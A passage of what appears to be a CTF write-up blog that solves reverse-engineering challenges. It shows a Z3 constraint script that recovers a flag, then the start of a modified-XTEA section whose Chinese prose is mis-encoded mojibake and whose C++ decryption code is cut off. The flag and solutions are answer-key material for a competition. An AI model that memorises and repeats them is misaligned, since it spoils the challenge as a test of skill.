class="line">s.add(<span class="number">11</span> * Enc[<span class="number">0</span>] + <span class="number">22</span> * Enc[<span class="number">1</span>] + <span class="number">33</span> * Enc[<span class="number">2</span>] + <span class="number">44</span> * Enc[<span class="number">3</span>] + <span class="number">55</span> * Enc[<span class="number">4</span>] + <span class="number">66</span> * Enc[<span class="number">5</span>] - <span class="number">77</span> * Enc[<span class="number">6</span>] == <span class="number">7975</span>)</span><br><span class="line">s.add(((<span class="number">21</span> * Enc[<span class="number">0</span>] + <span class="number">23</span> * Enc[<span class="number">1</span>] + <span class="number">3</span> * Enc[<span class="number">2</span>] + <span class="number">24</span> * Enc[<span class="number">3</span>] - <span class="number">55</span> * Enc[<span class="number">4</span>]) + <span class="number">6</span> * Enc[<span class="number">5</span>] - <span class="number">7</span> * Enc[<span class="number">6</span>]) + <span class="number">15</span> * Enc[<span class="number">7</span>] == <span class="number">229</span>)</span><br><span class="line">s.add((<span class="number">2</span> * Enc[<span class="number">0</span>] + <span class="number">26</span> * Enc[<span class="number">1</span>] + <span class="number">13</span> * Enc[<span class="number">2</span>] + <span class="number">0</span> * Enc[<span class="number">3</span>] - <span class="number">65</span> * Enc[<span class="number">4</span>]) + <span class="number">15</span> * Enc[<span class="number">5</span>] + <span class="number">29</span> * Enc[<span class="number">6</span>] + <span class="number">1</span> * Enc[<span class="number">7</span>] + <span class="number">20</span> * Enc[<span class="number">8</span>] == <span class="number">2107</span>)</span><br><span class="line">s.add((<span class="number">10</span> * Enc[<span class="number">0</span>] + <span class="number">7</span> * Enc[<span class="number">1</span>] + -<span class="number">9</span> * Enc[<span class="number">2</span>] + <span class="number">6</span> * Enc[<span class="number">3</span>] + <span class="number">7</span> * Enc[<span class="number">4</span>] + <span class="number">1</span> * Enc[<span class="number">5</span>] + <span class="number">22</span> * Enc[<span class="number">6</span>] + <span class="number">21</span> * Enc[<span class="number">7</span>] - <span class="number">22</span> * Enc[<span class="number">8</span>]) + <span class="number">30</span> * Enc[<span class="number">9</span>] == <span class="number">4037</span>)</span><br><span class="line">s.add((<span class="number">15</span> * Enc[<span class="number">0</span>] + <span class="number">59</span> * Enc[<span class="number">1</span>] + <span class="number">56</span> * Enc[<span class="number">2</span>] + <span class="number">66</span> * Enc[<span class="number">3</span>] + <span class="number">7</span> * Enc[<span class="number">4</span>] + <span class="number">1</span> * Enc[<span class="number">5</span>] - <span class="number">122</span> * Enc[<span class="number">6</span>]) + <span class="number">21</span> * Enc[<span class="number">7</span>] + <span class="number">32</span> * Enc[<span class="number">8</span>] + <span class="number">3</span> * Enc[<span class="number">9</span>] - <span class="number">10</span> * Enc[<span class="number">10</span>] == <span class="number">4950</span>)</span><br><span class="line">s.add((((<span class="number">13</span> * Enc[<span class="number">0</span>] + <span class="number">66</span> * Enc[<span class="number">1</span>] + <span class="number">29</span> * Enc[<span class="number">2</span>] + <span class="number">39</span> * Enc[<span class="number">3</span>] - <span class="number">33</span> * Enc[<span class="number">4</span>]) + <span class="number">13</span> * Enc[<span class="number">5</span>] - <span class="number">2</span> * Enc[<span class="number">6</span>]) + <span class="number">42</span> * Enc[<span class="number">7</span>] + <span class="number">62</span> * Enc[<span class="number">8</span>] + <span class="number">1</span> * Enc[<span class="number">9</span>] - <span class="number">10</span> * Enc[<span class="number">10</span>]) + <span class="number">11</span> * Enc[<span class="number">11</span>] == <span class="number">12544</span>)</span><br><span class="line">s.add((((<span class="number">23</span> * Enc[<span class="number">0</span>] + <span class="number">6</span> * Enc[<span class="number">1</span>] + <span class="number">29</span> * Enc[<span class="number">2</span>] + <span class="number">3</span> * Enc[<span class="number">3</span>] - <span class="number">3</span> * Enc[<span class="number">4</span>]) + <span class="number">63</span> * Enc[<span class="number">5</span>] - <span class="number">25</span> * Enc[<span class="number">6</span>]) + <span class="number">2</span> * Enc[<span class="number">7</span>] + <span class="number">32</span> * Enc[<span class="number">8</span>] + <span class="number">1</span> * Enc[<span class="number">9</span>] - <span class="number">10</span> * Enc[<span class="number">10</span>]) + <span class="number">11</span> * Enc[<span class="number">11</span>] - <span class="number">12</span> * Enc[<span class="number">12</span>] == <span class="number">6585</span>)</span><br><span class="line">s.add(((((<span class="number">223</span> * Enc[<span class="number">0</span>] + <span class="number">6</span> * Enc[<span class="number">1</span>] - <span class="number">29</span> * Enc[<span class="number">2</span>] - <span class="number">53</span> * Enc[<span class="number">3</span>] - <span class="number">3</span> * Enc[<span class="number">4</span>]) + <span class="number">3</span> * Enc[<span class="number">5</span>] - <span class="number">65</span> * Enc[<span class="number">6</span>]) + <span class="number">0</span> * Enc[<span class="number">7</span>] + <span class="number">36</span> * Enc[<span class="number">8</span>] + <span class="number">1</span> * Enc[<span class="number">9</span>] - <span class="number">15</span> * Enc[<span class="number">10</span>]) + <span class="number">16</span> * Enc[<span class="number">11</span>] - <span class="number">18</span> * Enc[<span class="number">12</span>]) + <span class="number">13</span> * Enc[<span class="number">13</span>] == <span class="number">6893</span>)</span><br><span class="line">s.add(((((<span class="number">29</span> * Enc[<span class="number">0</span>] + <span class="number">13</span> * Enc[<span class="number">1</span>] - <span class="number">9</span> * Enc[<span class="number">2</span>] - <span class="number">93</span> * Enc[<span class="number">3</span>]) + <span class="number">33</span> * Enc[<span class="number">4</span>] + <span class="number">6</span> * Enc[<span class="number">5</span>] + <span class="number">65</span> * Enc[<span class="number">6</span>] + <span class="number">1</span> * Enc[<span class="number">7</span>] - <span class="number">36</span> * Enc[<span class="number">8</span>]) + <span class="number">0</span> * Enc[<span class="number">9</span>] - <span class="number">16</span> * Enc[<span class="number">10</span>]) + <span class="number">96</span> * Enc[<span class="number">11</span>] - <span class="number">68</span> * Enc[<span class="number">12</span>]) + <span class="number">33</span> * Enc[<span class="number">13</span>] - <span class="number">14</span> * Enc[<span class="number">14</span>] == <span class="number">1883</span>)</span><br><span class="line">s.add((((<span class="number">69</span> * Enc[<span class="number">0</span>] + <span class="number">77</span> * Enc[<span class="number">1</span>] - <span class="number">93</span> * Enc[<span class="number">2</span>] - <span class="number">12</span> * Enc[<span class="number">3</span>]) + <span class="number">0</span> * Enc[<span class="number">4</span>] + <span class="number">0</span> * Enc[<span class="number">5</span>] + <span class="number">1</span> * Enc[<span class="number">6</span>] + <span class="number">16</span> * Enc[<span class="number">7</span>] + <span class="number">36</span> * Enc[<span class="number">8</span>] + <span class="number">6</span> * Enc[<span class="number">9</span>] + <span class="number">19</span> * Enc[<span class="number">10</span>] + <span class="number">66</span> * Enc[<span class="number">11</span>] - <span class="number">8</span> * Enc[<span class="number">12</span>]) + <span class="number">38</span> * Enc[<span class="number">13</span>] - <span class="number">16</span> * Enc[<span class="number">14</span>]) + <span class="number">15</span> * Enc[<span class="number">15</span>] == <span class="number">8257</span>)</span><br><span class="line">s.add(((((<span class="number">23</span> * Enc[<span class="number">0</span>] + <span class="number">2</span> * Enc[<span class="number">1</span>] - <span class="number">3</span> * Enc[<span class="number">2</span>] - <span class="number">11</span> * Enc[<span class="number">3</span>]) + <span class="number">12</span> * Enc[<span class="number">4</span>] + <span class="number">24</span> * Enc[<span class="number">5</span>] + <span class="number">1</span> * Enc[<span class="number">6</span>] + <span class="number">6</span> * Enc[<span class="number">7</span>] + <span class="number">14</span> * Enc[<span class="number">8</span>] - <span class="number">0</span> * Enc[<span class="number">9</span>]) + <span class="number">1</span> * Enc[<span class="number">10</span>] + <span class="number">68</span> * Enc[<span class="number">11</span>] - <span class="number">18</span> * Enc[<span class="number">12</span>]) + <span class="number">68</span> * Enc[<span class="number">13</span>] - <span class="number">26</span> * Enc[<span class="number">14</span>]) + <span class="number">15</span> * Enc[<span class="number">15</span>] - <span class="number">16</span> * Enc[<span class="number">16</span>] == <span class="number">5847</span>)</span><br><span class="line">s.add((((((<span class="number">24</span> * Enc[<span class="number">0</span>] + <span class="number">0</span> * Enc[<span class="number">1</span>] - <span class="number">1</span> * Enc[<span class="number">2</span>] - <span class="number">15</span> * Enc[<span class="number">3</span>]) + <span class="number">13</span> * Enc[<span class="number">4</span>] + <span class="number">4</span> * Enc[<span class="number">5</span>] + <span class="number">16</span> * Enc[<span class="number">6</span>] + <span class="number">67</span> * Enc[<span class="number">7</span>] + <span class="number">146</span> * Enc[<span class="number">8</span>] - <span class="number">50</span> * Enc[<span class="number">9</span>]) + <span class="number">16</span> * Enc[<span class="number">10</span>] + <span class="number">6</span> * Enc[<span class="number">11</span>] - <span class="number">1</span> * Enc[<span class="number">12</span>]) + <span class="number">69</span> * Enc[<span class="number">13</span>] - <span class="number">27</span> * Enc[<span class="number">14</span>]) + <span class="number">45</span> * Enc[<span class="number">15</span>] - <span class="number">6</span> * Enc[<span class="number">16</span>]) + <span class="number">17</span> * Enc[<span class="number">17</span>] == <span class="number">18257</span>)</span><br><span class="line">s.add(((((<span class="number">25</span> * Enc[<span class="number">0</span>] + <span class="number">26</span> * Enc[<span class="number">1</span>] - <span class="number">89</span> * Enc[<span class="number">2</span>]) + <span class="number">16</span> * Enc[<span class="number">3</span>] + <span class="number">19</span> * Enc[<span class="number">4</span>] + <span class="number">44</span> * Enc[<span class="number">5</span>] + <span class="number">36</span> * Enc[<span class="number">6</span>] + <span class="number">66</span> * Enc[<span class="number">7</span>] - <span class="number">150</span> * Enc[<span class="number">8</span>] - <span class="number">250</span> * Enc[<span class="number">9</span>]) + <span class="number">166</span> * Enc[<span class="number">10</span>] + <span class="number">126</span> * Enc[<span class="number">11</span>] - <span class="number">11</span> * Enc[<span class="number">12</span>]) + <span class="number">690</span> * Enc[<span class="number">13</span>] - <span class="number">207</span> * Enc[<span class="number">14</span>]) + <span class="number">46</span> * Enc[<span class="number">15</span>] + <span class="number">6</span> * Enc[<span class="number">16</span>] + <span class="number">7</span> * Enc[<span class="number">17</span>] - <span class="number">18</span> * Enc[<span class="number">18</span>] == <span class="number">12591</span>)</span><br><span class="line">s.add((((((<span class="number">5</span> * Enc[<span class="number">0</span>] + <span class="number">26</span> * Enc[<span class="number">1</span>] + <span class="number">8</span> * Enc[<span class="number">2</span>] + <span class="number">160</span> * Enc[<span class="number">3</span>] + <span class="number">9</span> * Enc[<span class="number">4</span>] - <span class="number">4</span> * Enc[<span class="number">5</span>]) + <span class="number">36</span> * Enc[<span class="number">6</span>] + <span class="number">6</span> * Enc[<span class="number">7</span>] - <span class="number">15</span> * Enc[<span class="number">8</span>] - <span class="number">20</span> * Enc[<span class="number">9</span>]) + <span class="number">66</span> * Enc[<span class="number">10</span>] + <span class="number">16</span> * Enc[<span class="number">11</span>] - <span class="number">1</span> * Enc[<span class="number">12</span>]) + <span class="number">690</span> * Enc[<span class="number">13</span>] - <span class="number">20</span> * Enc[<span class="number">14</span>]) + <span class="number">46</span> * Enc[<span class="number">15</span>] + <span class="number">6</span> * Enc[<span class="number">16</span>] + <span class="number">7</span> * Enc[<span class="number">17</span>] - <span class="number">18</span> * Enc[<span class="number">18</span>]) + <span class="number">19</span> * Enc[<span class="number">19</span>] == <span class="number">52041</span>)</span><br><span class="line">s.add(((((((<span class="number">29</span> * Enc[<span class="number">0</span>] - <span class="number">26</span> * Enc[<span class="number">1</span>]) + <span class="number">0</span> * Enc[<span class="number">2</span>] + <span class="number">60</span> * Enc[<span class="number">3</span>] + <span class="number">90</span> * Enc[<span class="number">4</span>] - <span class="number">4</span> * Enc[<span class="number">5</span>]) + <span class="number">6</span> * Enc[<span class="number">6</span>] + <span class="number">6</span> * Enc[<span class="number">7</span>] - <span class="number">16</span> * Enc[<span class="number">8</span>] - <span class="number">21</span> * Enc[<span class="number">9</span>]) + <span class="number">69</span> * Enc[<span class="number">10</span>] + <span class="number">6</span> * Enc[<span class="number">11</span>] - <span class="number">12</span> * Enc[<span class="number">12</span>]) + <span class="number">69</span> * Enc[<span class="number">13</span>] - <span class="number">20</span> * Enc[<span class="number">14</span>] - <span class="number">46</span> * Enc[<span class="number">15</span>]) + <span class="number">65</span> * Enc[<span class="number">16</span>] + <span class="number">0</span> * Enc[<span class="number">17</span>] - <span class="number">1</span> * Enc[<span class="number">18</span>]) + <span class="number">39</span> * Enc[<span class="number">19</span>] - <span class="number">20</span> * Enc[<span class="number">20</span>] == <span class="number">20253</span>)</span><br><span class="line">s.add((((((((<span class="number">45</span> * Enc[<span class="number">0</span>] - <span class="number">56</span> * Enc[<span class="number">1</span>]) + <span class="number">10</span> * Enc[<span class="number">2</span>] + <span class="number">650</span> * Enc[<span class="number">3</span>] - <span class="number">900</span> * Enc[<span class="number">4</span>]) + <span class="number">44</span> * Enc[<span class="number">5</span>] + <span class="number">66</span> * Enc[<span class="number">6</span>] - <span class="number">6</span> * Enc[<span class="number">7</span>] - <span class="number">6</span> * Enc[<span class="number">8</span>] - <span class="number">21</span> * Enc[<span class="number">9</span>]) + <span class="number">9</span> * Enc[<span class="number">10</span>] - <span class="number">6</span> * Enc[<span class="number">11</span>] - <span class="number">12</span> * Enc[<span class="number">12</span>]) + <span class="number">69</span> * Enc[<span class="number">13</span>] - <span class="number">2</span> * Enc[<span class="number">14</span>] - <span class="number">406</span> * Enc[<span class="number">15</span>]) + <span class="number">651</span> * Enc[<span class="number">16</span>] + <span class="number">2</span> * Enc[<span class="number">17</span>] - <span class="number">10</span> * Enc[<span class="number">18</span>]) + <span class="number">69</span> * Enc[<span class="number">19</span>] - <span class="number">0</span> * Enc[<span class="number">20</span>]) + <span class="number">21</span> * Enc[<span class="number">21</span>] == <span class="number">18768</span>)</span><br><span class="line">s.add((((((<span class="number">555</span> * Enc[<span class="number">0</span>] - <span class="number">6666</span> * Enc[<span class="number">1</span>]) + <span class="number">70</span> * Enc[<span class="number">2</span>] + <span class="number">510</span> * Enc[<span class="number">3</span>] - <span class="number">90</span> * Enc[<span class="number">4</span>]) + <span class="number">499</span> * Enc[<span class="number">5</span>] + <span class="number">66</span> * Enc[<span class="number">6</span>] - <span class="number">66</span> * Enc[<span class="number">7</span>] - <span class="number">610</span> * Enc[<span class="number">8</span>] - <span class="number">221</span> * Enc[<span class="number">9</span>]) + <span class="number">9</span> * Enc[<span class="number">10</span>] - <span class="number">23</span> * Enc[<span class="number">11</span>] - <span class="number">102</span> * Enc[<span class="number">12</span>]) + <span class="number">6</span> * Enc[<span class="number">13</span>] + <span class="number">2050</span> * Enc[<span class="number">14</span>] - <span class="number">406</span> * Enc[<span class="number">15</span>]) + <span class="number">665</span> * Enc[<span class="number">16</span>] + <span class="number">333</span> * Enc[<span class="number">17</span>] + <span class="number">100</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">777</span> * Enc[<span class="number">20</span>] + <span class="number">201</span> * Enc[<span class="number">21</span>] - <span class="number">22</span> * Enc[<span class="number">22</span>] == <span class="number">111844</span>)</span><br><span class="line">s.add((((((((<span class="number">1</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">333</span> * Enc[<span class="number">2</span>] + <span class="number">4444</span> * Enc[<span class="number">3</span>] - <span class="number">5555</span> * Enc[<span class="number">4</span>]) + <span class="number">6666</span> * Enc[<span class="number">5</span>] - <span class="number">666</span> * Enc[<span class="number">6</span>]) + <span class="number">676</span> * Enc[<span class="number">7</span>] - <span class="number">660</span> * Enc[<span class="number">8</span>] - <span class="number">22</span> * Enc[<span class="number">9</span>]) + <span class="number">9</span> * Enc[<span class="number">10</span>] - <span class="number">73</span> * Enc[<span class="number">11</span>] - <span class="number">107</span> * Enc[<span class="number">12</span>]) + <span class="number">6</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] - <span class="number">6</span> * Enc[<span class="number">15</span>]) + <span class="number">65</span> * Enc[<span class="number">16</span>] + <span class="number">39</span> * Enc[<span class="number">17</span>] + <span class="number">10</span> * Enc[<span class="number">18</span>] + <span class="number">69</span> * Enc[<span class="number">19</span>] + <span class="number">777</span> * Enc[<span class="number">20</span>] + <span class="number">201</span> * Enc[<span class="number">21</span>] - <span class="number">2</span> * Enc[<span class="number">22</span>]) + <span class="number">23</span> * Enc[<span class="number">23</span>] == <span class="number">159029</span>)</span><br><span class="line">s.add((((<span class="number">520</span> * Enc[<span class="number">0</span>] - <span class="number">222</span> * Enc[<span class="number">1</span>]) + <span class="number">333</span> * Enc[<span class="number">2</span>] + <span class="number">4</span> * Enc[<span class="number">3</span>] - <span class="number">56655</span> * Enc[<span class="number">4</span>]) + <span class="number">6666</span> * Enc[<span class="number">5</span>] + <span class="number">666</span> * Enc[<span class="number">6</span>] + <span class="number">66</span> * Enc[<span class="number">7</span>] - <span class="number">60</span> * Enc[<span class="number">8</span>] - <span class="number">220</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">73</span> * Enc[<span class="number">11</span>] + <span class="number">1007</span> * Enc[<span class="number">12</span>] + <span class="number">7777</span> * Enc[<span class="number">13</span>] + <span class="number">2500</span> * Enc[<span class="number">14</span>] + <span class="number">6666</span> * Enc[<span class="number">15</span>] + <span class="number">605</span> * Enc[<span class="number">16</span>] + <span class="number">390</span> * Enc[<span class="number">17</span>] + <span class="number">100</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">99999</span> * Enc[<span class="number">20</span>] + <span class="number">210</span> * Enc[<span class="number">21</span>] + <span class="number">232</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">24</span> * Enc[<span class="number">24</span>] == <span class="number">2762025</span>)</span><br><span class="line">s.add(((((<span class="number">1323</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">333</span> * Enc[<span class="number">2</span>] + <span class="number">4</span> * Enc[<span class="number">3</span>] - <span class="number">55</span> * Enc[<span class="number">4</span>]) + <span class="number">666</span> * Enc[<span class="number">5</span>] + <span class="number">666</span> * Enc[<span class="number">6</span>] + <span class="number">66</span> * Enc[<span class="number">7</span>] - <span class="number">660</span> * Enc[<span class="number">8</span>] - <span class="number">220</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">100</span> * Enc[<span class="number">12</span>] + <span class="number">777</span> * Enc[<span class="number">13</span>] + <span class="number">2500</span> * Enc[<span class="number">14</span>] + <span class="number">6666</span> * Enc[<span class="number">15</span>] + <span class="number">605</span> * Enc[<span class="number">16</span>] + <span class="number">390</span> * Enc[<span class="number">17</span>] + <span class="number">100</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">9999</span> * Enc[<span class="number">20</span>] + <span class="number">210</span> * Enc[<span class="number">21</span>] + <span class="number">232</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">24</span> * Enc[<span class="number">24</span>]) + <span class="number">25</span> * Enc[<span class="number">25</span>] == <span class="number">1551621</span>)</span><br><span class="line">s.add((((((<span class="number">777</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">6969</span> * Enc[<span class="number">2</span>] + <span class="number">4</span> * Enc[<span class="number">3</span>] - <span class="number">55</span> * Enc[<span class="number">4</span>]) + <span class="number">666</span> * Enc[<span class="number">5</span>] - <span class="number">6</span> * Enc[<span class="number">6</span>]) + <span class="number">96</span> * Enc[<span class="number">7</span>] - <span class="number">60</span> * Enc[<span class="number">8</span>] - <span class="number">220</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">100</span> * Enc[<span class="number">12</span>] + <span class="number">777</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] + <span class="number">666</span> * Enc[<span class="number">15</span>] + <span class="number">65</span> * Enc[<span class="number">16</span>] + <span class="number">90</span> * Enc[<span class="number">17</span>] + <span class="number">100</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">999</span> * Enc[<span class="number">20</span>] + <span class="number">21</span> * Enc[<span class="number">21</span>] + <span class="number">232</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">24</span> * Enc[<span class="number">24</span>]) + <span class="number">25</span> * Enc[<span class="number">25</span>] - <span class="number">26</span> * Enc[<span class="number">26</span>] == <span class="number">948348</span>)</span><br><span class="line">s.add(((((((<span class="number">97</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">6969</span> * Enc[<span class="number">2</span>] + <span class="number">4</span> * Enc[<span class="number">3</span>] - <span class="number">56</span> * Enc[<span class="number">4</span>]) + <span class="number">96</span> * Enc[<span class="number">5</span>] - <span class="number">6</span> * Enc[<span class="number">6</span>]) + <span class="number">96</span> * Enc[<span class="number">7</span>] - <span class="number">60</span> * Enc[<span class="number">8</span>] - <span class="number">20</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">10</span> * Enc[<span class="number">12</span>] + <span class="number">707</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] + <span class="number">666</span> * Enc[<span class="number">15</span>] + -<span class="number">9</span> * Enc[<span class="number">16</span>] + <span class="number">90</span> * Enc[<span class="number">17</span>] + -<span class="number">2</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">0</span> * Enc[<span class="number">20</span>] + <span class="number">21</span> * Enc[<span class="number">21</span>] + <span class="number">2</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">24</span> * Enc[<span class="number">24</span>]) + <span class="number">25</span> * Enc[<span class="number">25</span>] - <span class="number">26</span> * Enc[<span class="number">26</span>]) + <span class="number">27</span> * Enc[<span class="number">27</span>] == <span class="number">777044</span>)</span><br><span class="line">s.add((((((<span class="number">177</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">699</span> * Enc[<span class="number">2</span>] + <span class="number">64</span> * Enc[<span class="number">3</span>] - <span class="number">56</span> * Enc[<span class="number">4</span>] - <span class="number">96</span> * Enc[<span class="number">5</span>] - <span class="number">66</span> * Enc[<span class="number">6</span>]) + <span class="number">96</span> * Enc[<span class="number">7</span>] - <span class="number">60</span> * Enc[<span class="number">8</span>] - <span class="number">20</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">10</span> * Enc[<span class="number">12</span>] + <span class="number">707</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] + <span class="number">666</span> * Enc[<span class="number">15</span>] + -<span class="number">9</span> * Enc[<span class="number">16</span>] + <span class="number">0</span> * Enc[<span class="number">17</span>] + -<span class="number">2</span> * Enc[<span class="number">18</span>] + <span class="number">69</span> * Enc[<span class="number">19</span>] + <span class="number">0</span> * Enc[<span class="number">20</span>] + <span class="number">21</span> * Enc[<span class="number">21</span>] + <span class="number">222</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">224</span> * Enc[<span class="number">24</span>]) + <span class="number">25</span> * Enc[<span class="number">25</span>] - <span class="number">26</span> * Enc[<span class="number">26</span>]) + <span class="number">27</span> * Enc[<span class="number">27</span>] - <span class="number">28</span> * Enc[<span class="number">28</span>] == <span class="number">185016</span>)</span><br><span class="line">s.add(((((((<span class="number">77</span> * Enc[<span class="number">0</span>] - <span class="number">2</span> * Enc[<span class="number">1</span>]) + <span class="number">6</span> * Enc[<span class="number">2</span>] + <span class="number">6</span> * Enc[<span class="number">3</span>] - <span class="number">96</span> * Enc[<span class="number">4</span>] - <span class="number">9</span> * Enc[<span class="number">5</span>] - <span class="number">6</span> * Enc[<span class="number">6</span>]) + <span class="number">96</span> * Enc[<span class="number">7</span>] - <span class="number">0</span> * Enc[<span class="number">8</span>] - <span class="number">20</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">10</span> * Enc[<span class="number">12</span>] + <span class="number">707</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] + <span class="number">666</span> * Enc[<span class="number">15</span>] + -<span class="number">9</span> * Enc[<span class="number">16</span>] + <span class="number">0</span> * Enc[<span class="number">17</span>] + -<span class="number">2</span> * Enc[<span class="number">18</span>] + <span class="number">9</span> * Enc[<span class="number">19</span>] + <span class="number">0</span> * Enc[<span class="number">20</span>] + <span class="number">21</span> * Enc[<span class="number">21</span>] + <span class="number">222</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">224</span> * Enc[<span class="number">24</span>]) + <span class="number">26</span> * Enc[<span class="number">25</span>] - -<span class="number">58</span> * Enc[<span class="number">26</span>]) + <span class="number">27</span> * Enc[<span class="number">27</span>] - <span class="number">2</span> * Enc[<span class="number">28</span>]) + <span class="number">29</span> * Enc[<span class="number">29</span>] == <span class="number">130106</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> Enc:</span><br><span class="line">    s.add(x &gt;= <span class="number">32</span>)</span><br><span class="line">    s.add(x &lt;= <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line"></span><br><span class="line">    solution = [m[x].as_long() <span class="keyword">if</span> m[x] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> Enc]</span><br><span class="line">    </span><br><span class="line">    decrypted = decrypt(solution)</span><br><span class="line">    <span class="built_in">print</span>(decrypted)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found&quot;</span>)</span><br></pre></td></tr></table></figure><p>HZNUCTF{ad7fa-76a7-ff6a-fffa-7f7d6a}</p><h2 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h2><p>åˆå§‹åŒ–ç½®ç§å­ srand äº†ä¸€æ¬¡ï¼Œç„¶åè¿™è¾¹é‡Œé¢åˆ¤æ–­æ˜¯å¦æœ‰è°ƒè¯•ï¼Œç„¶ååˆ srand äº†ä¸€éï¼Œå¯ä»¥å¿½ç•¥ï¼Œç§å­å°±æ˜¯ 0x7E8ã€‚</p><p>çº¢æ¡†å¤„æ˜¯å°†è¾“å…¥å­—ç¬¦ä¸²å››ä¸ªå››ä¸ªä¸€ç»„è¿›è¡Œç¿»è½¬ã€‚</p><p><img src="/2025/04/13/TGCTF2025/LcFbbxbB8oLeYkxPI0acu3jPnMd.png"></p><p>InitKey å‡½æ•°æ˜¯ç”¨ rand åˆå§‹åŒ–äº†å››ä¸ªæ•´æ•° Keyã€‚</p><p><img src="/2025/04/13/TGCTF2025/AhYVbAhIAobk91xB8j2cPWAjnad.png"></p><p>XTea æ˜¯é­”æ”¹çš„ï¼ŒDelta æ˜¯é ç”¨æˆ·è¾“å…¥ä¼ è¿›æ¥çš„ï¼Œé‚£ä¹ˆè¿™è¾¹ Delta æœªçŸ¥å°±éœ€è¦çˆ†ç ´ã€‚</p><p><img src="/2025/04/13/TGCTF2025/AhYXbfXq2oKkj0xtpUlc8qldnAe.png"></p><p>é¢˜ç›®æè¿°è¯´æœ‰ç‚¹ misc å‘³ï¼Œå‘ç°é™„ä»¶ä¸­è¿˜æœ‰ä¸ª readme é‡Œé¢çš„å‹ç¼©åŒ…å¯†ç å°±æ˜¯æ ‡å‡† Deltaï¼Œ<strong>2654435769 -&gt; 0x9E3779B9</strong></p><p>ç›´æ¥ç¼–å†™è§£å¯†ï¼Œä½¿ç”¨è¯¥ Delta å°±å¯ä»¥è§£å‡º flagã€‚</p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 